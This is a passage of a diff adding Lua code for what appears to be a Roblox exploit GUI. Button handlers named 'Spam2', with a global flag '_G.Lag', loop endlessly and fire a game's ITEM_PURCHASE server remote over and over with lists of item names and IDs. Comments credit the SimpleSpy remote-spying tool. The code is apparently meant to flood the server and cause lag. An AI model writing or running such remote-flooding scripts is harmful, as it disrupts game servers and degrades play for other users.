+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Banded Top Hat",
+					[2] = "8",
+					[3] = "5275861024",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Fedora",
+					[2] = "8",
+					[3] = "5314012437",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Corruption Henchmen",
+					[2] = "47",
+					[3] = "5063561894",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Menacing",
+					[2] = "8",
+					[3] = "4238305136",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Rainbow Growing Corruption Right",
+					[2] = "42",
+					[3] = "5314332058",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Dark Matter Fedora",
+					[2] = "8",
+					[3] = "5357509575",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Dark Matter Sword",
+					[2] = "46",
+					[3] = "5355685721",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Robe",
+					[2] = "46",
+					[3] = "5314965699",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Negative Horns",
+					[2] = "8",
+					[3] = "5233472439",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Dark Matter Head",
+					[2] = "8",
+					[3] = "5355731757",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Bow Tie",
+					[2] = "43",
+					[3] = "5314000093",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Gamer Keyboard",
+					[2] = "46",
+					[3] = "5548852071",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Rainbow Cartoon Demon",
+					[2] = "8",
+					[3] = "5410759729",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Halo",
+					[2] = "8",
+					[3] = "5230690394",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Antlers",
+					[2] = "8",
+					[3] = "5197568832",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Rave Mask",
+					[2] = "42",
+					[3] = "5319940357",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Head",
+					[2] = "8",
+					[3] = "5231646851",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Cursed Flames",
+					[2] = "45",
+					[3] = "3756389957",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Sparkling Angel Wings",
+					[2] = "46",
+					[3] = "192557913",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				wait()
+				local args2 = {
+					[1] = "Flaming Mohawk",
+					[2] = "41",
+					[3] = "191101707",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args2))
+				wait()
+				local args3 = {
+					[1] = "Spring Fairy",
+					[2] = "44",
+					[3] = "150381051",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args3))
+				wait()
+				local args = {
+					[1] = "Black Trendy Hat",
+					[2] = "8",
+					[3] = "4904891637",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+			end
+		end
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+	end)
+end
+coroutine.wrap(WIPZ_fake_script)()
+local function VVZZAQ_fake_script() -- Spam2.Script 
+	local script = Instance.new('Script', Spam2)
+
+	local button = script.Parent
+	_G.Lag = false
+	
+	button.MouseButton1Click:Connect(function()
+		_G.Lag = true
+		
+		while true do
+			if _G.Lag == true then
+				local args = {
+					[1] = "Sparkling Angel Wings",
+					[2] = "46",
+					[3] = "192557913",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Spring Fairy",
+					[2] = "44",
+					[3] = "150381051",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Flaming Mohawk",
+					[2] = "41",
+					[3] = "191101707",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Menacing",
+					[2] = "8",
+					[3] = "4238305136",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Fiery Horns of the Netherworld",
+					[2] = "8",
+					[3] = "215718515",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Frozen Horns of the Frigid Planes",
+					[2] = "8",
+					[3] = "74891470",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Cursed Flames",
+					[2] = "45",
+					[3] = "3756389957",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Cursed Flames",
+					[2] = "45",
+					[3] = "3756389957",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Red Flame Aura - Top",
+					[2] = "44",
+					[3] = "5548638720",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "52 Pickup",
+					[2] = "8",
+					[3] = "4904139820",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Rainbow Katana Set",
+					[2] = "47",
+					[3] = "5410248084",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Red Flame Aura",
+					[2] = "47",
+					[3] = "5463718312",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Kawaii Confetti",
+					[2] = "8",
+					[3] = "5067732877",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Neon Flame Aura",
+					[2] = "47",
+					[3] = "5463621720",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Blue Butterflies",
+					[2] = "8",
+					[3] = "4597874025",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Demon",
+					[2] = "46",
+					[3] = "5319867017",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Falling Blossoms",
+					[2] = "8",
+					[3] = "4665773975",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Sakura Aura",
+					[2] = "47",
+					[3] = "5321023132",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Dark Flame Aura",
+					[2] = "47",
+					[3] = "5463688787",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Sparkling Shine",
+					[2] = "8",
+					[3] = "4641935884",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Neon Flame Aura - Top",
+					[2] = "44",
+					[3] = "5548531343",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Sleep Paralysis Demon",
+					[2] = "46",
+					[3] = "4932832113",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Outline Spiked Floof Tail",
+					[2] = "47",
+					[3] = "5355976632",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Banded Top Hat",
+					[2] = "8",
+					[3] = "5275861024",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Fedora",
+					[2] = "8",
+					[3] = "5314012437",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Corruption Henchmen",
+					[2] = "47",
+					[3] = "5063561894",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Menacing",
+					[2] = "8",
+					[3] = "4238305136",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Rainbow Growing Corruption Right",
+					[2] = "42",
+					[3] = "5314332058",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Dark Matter Fedora",
+					[2] = "8",
+					[3] = "5357509575",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Dark Matter Sword",
+					[2] = "46",
+					[3] = "5355685721",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Robe",
+					[2] = "46",
+					[3] = "5314965699",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Negative Horns",
+					[2] = "8",
+					[3] = "5233472439",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Dark Matter Head",
+					[2] = "8",
+					[3] = "5355731757",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Bow Tie",
+					[2] = "43",
+					[3] = "5314000093",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Gamer Keyboard",
+					[2] = "46",
+					[3] = "5548852071",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Rainbow Cartoon Demon",
+					[2] = "8",
+					[3] = "5410759729",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Halo",
+					[2] = "8",
+					[3] = "5230690394",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Antlers",
+					[2] = "8",
+					[3] = "5197568832",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Rave Mask",
+					[2] = "42",
+					[3] = "5319940357",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Head",
+					[2] = "8",
+					[3] = "5231646851",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Cursed Flames",
+					[2] = "45",
+					[3] = "3756389957",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Sparkling Angel Wings",
+					[2] = "46",
+					[3] = "192557913",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				wait()
+				local args2 = {
+					[1] = "Flaming Mohawk",
+					[2] = "41",
+					[3] = "191101707",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args2))
+				wait()
+				local args3 = {
+					[1] = "Spring Fairy",
+					[2] = "44",
+					[3] = "150381051",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args3))
+				wait()
+				local args = {
+					[1] = "Black Trendy Hat",
+					[2] = "8",
+					[3] = "4904891637",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+			end
+		end
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+	end)
+end
+coroutine.wrap(VVZZAQ_fake_script)()
+local function GRSX_fake_script() -- Spam2.Script 
+	local script = Instance.new('Script', Spam2)
+
+	local button = script.Parent
+	_G.Lag = false
+	
+	button.MouseButton1Click:Connect(function()
+		_G.Lag = true
+		
+		while true do
+			if _G.Lag == true then
+				local args = {
+					[1] = "Sparkling Angel Wings",
+					[2] = "46",
+					[3] = "192557913",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Spring Fairy",
+					[2] = "44",
+					[3] = "150381051",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Flaming Mohawk",
+					[2] = "41",
+					[3] = "191101707",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Menacing",
+					[2] = "8",
+					[3] = "4238305136",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Fiery Horns of the Netherworld",
+					[2] = "8",
+					[3] = "215718515",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Frozen Horns of the Frigid Planes",
+					[2] = "8",
+					[3] = "74891470",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Cursed Flames",
+					[2] = "45",
+					[3] = "3756389957",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Cursed Flames",
+					[2] = "45",
+					[3] = "3756389957",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Red Flame Aura - Top",
+					[2] = "44",
+					[3] = "5548638720",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "52 Pickup",
+					[2] = "8",
+					[3] = "4904139820",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Rainbow Katana Set",
+					[2] = "47",
+					[3] = "5410248084",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Red Flame Aura",
+					[2] = "47",
+					[3] = "5463718312",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Kawaii Confetti",
+					[2] = "8",
+					[3] = "5067732877",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Neon Flame Aura",
+					[2] = "47",
+					[3] = "5463621720",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Blue Butterflies",
+					[2] = "8",
+					[3] = "4597874025",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Demon",
+					[2] = "46",
+					[3] = "5319867017",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Falling Blossoms",
+					[2] = "8",
+					[3] = "4665773975",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Sakura Aura",
+					[2] = "47",
+					[3] = "5321023132",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Dark Flame Aura",
+					[2] = "47",
+					[3] = "5463688787",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Sparkling Shine",
+					[2] = "8",
+					[3] = "4641935884",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
